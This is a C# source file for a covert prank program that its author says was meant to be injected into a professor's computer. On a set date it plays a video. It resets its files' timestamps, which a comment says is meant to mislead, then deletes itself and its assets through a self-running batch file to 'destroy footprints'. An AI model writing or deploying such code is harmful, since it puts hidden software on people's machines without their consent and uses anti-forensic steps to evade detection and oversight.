using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using BoneFier.Basic;
using ReflectionClassOverriding;
using BoneFier;
using System.Reflection;

namespace Script
{
    /// <summary>
    /// the Script that I palnned to inject to one our professor in the university for fun.
    /// </summary>
    internal class HappyTrolling : Behavior
    {
        static AppConfig config;
        static bool TrollsActivated = false;
        static bool DebugMode = false;

        public static string VideoName = "TROLLshowvid.wmv";
        public static string VideoPath = Program.asset.AssetDirectory + VideoName;

        void Start()
        {

        }
        void Update()
        {
            config = Program.application.ApplicationConfig;

            if (!TrollsActivated)
            {
                RunTimeLoop.LoopActivationState = false;
                ChangeFilesDates();

                if (Calendarmanager.CheckActivationDate(config.Activationdate.ToDateTime()))
                {
                    if (!config.Enable)
                    {
                        Debuger.PrintWarning("The program is disabled.");
                        DestroyFootPrint();
                        return;
                    }

                    Debuger.Print("Trolls Activated");
                    TrollsActivated = true;
                    //ترول فعال میشود

                    //MultipleErros(3);
                    PlayVideo();
                }
            }
        }

        //برای فعال سازی ویدیو پلیر به دو فایل دی ال ال نیاز است:
        //AxInterop.WMPLib.dll
        //Interop.WMPLib.dll

        //windows xp error song
        //siuuu = https://www.youtube.com/watch?v=em5rwYX8DVY
        //Man yek hackeram = https://www.youtube.com/shorts/1X9uIWQgHR4
        //Sedasima hack khabarnegar reaction
        //Watch dogs 2 hack trailer
        //Watch dogs 2 hack world
        //Aqa "SAKET!"
        //Bache biyapaen
        static void PlayVideo()
        {

            Debuger.Print("Playing video.");

            try
            {
                Trollplayer videoplayer = new Trollplayer();
                videoplayer.OnVideoEnded += OnVideoEnded;
                System.Windows.Forms.Application.Run(videoplayer);
            }
            catch (Exception ex)
            {
                Debuger.LogError("Could not run Trollmedia.exception: " + ex.Message);
            }
        }

        static void OnVideoEnded()
        {
            if (!DebugMode)
                DestroyFootPrint();
        }

        static void DestroyFootPrint() // تابع پاک کردن رد پا
        {
            Debuger.Print("Destroying foot prints.");

            try
            {
                Kernel.RemoveStartUp(Program.emigrator.ApplicationName); //حذف کردن برنامه از لیست برنامه های استارت اپ



                //حذف اسِت ها
                Directory.Delete(Program.asset.AssetDirectory, true);

                Application.Exit(); //Good bye world.
            }
            catch (Exception ex)
            {
                Debuger.PrintError($"Failed to destroying foot prints. exception: {ex.Message}");
            }
        }
        static void CreatBatchFile()
        {
            //ساخت فایل بت برای حذف فایل ها و برنامه
            /*BATCH code for deleting files:
                 timeout 1
                 @RD /S /Q "BFasset"
                 del AxInterop.WMPLib.dll
                 del BoneFierApp.exe
                 del Interop.WMPLib.dll
                 del FootCleanerBATCH.bat
             */

            string BATscript = "timeout 1\n@RD /S /Q \"BFasset\"\ndel AxInterop.WMPLib.dll\ndel BoneFierApp.exe\ndel Interop.WMPLib.dll\ndel FootprintCleaner.bat";

            string BatPath = Program.emigrator.EmigrationPath + @"FootprintCleaner.bat";
            File.WriteAllText(BatPath, BATscript);

            Process.Start(BatPath);
        }
        static void ChangeFilesDates()
        {
            //تغییر زمان ساخت فایل و اخرین دسترسی و اخرین تغییر  برای گمراه سازی

            DateTime time = DateTime.Now;

            string app = Program.emigrator.EmigrationPath + Program.emigrator.ApplicationName + ".exe";

            Kernel.Change3DatesFile(app, time);

            string dll1 = Program.emigrator.EmigrationPath + @"\AxInterop.WMPLib.dll";

            Kernel.Change3DatesFile(dll1, time);

            string dll2 = Program.emigrator.EmigrationPath + @"\Interop.WMPLib.dll";

            Kernel.Change3DatesFile(dll2, time);

            string appfolder = Program.emigrator.EmigrationPath;

            Kernel.Change3DatesFile(appfolder, time);
        }
    }
}
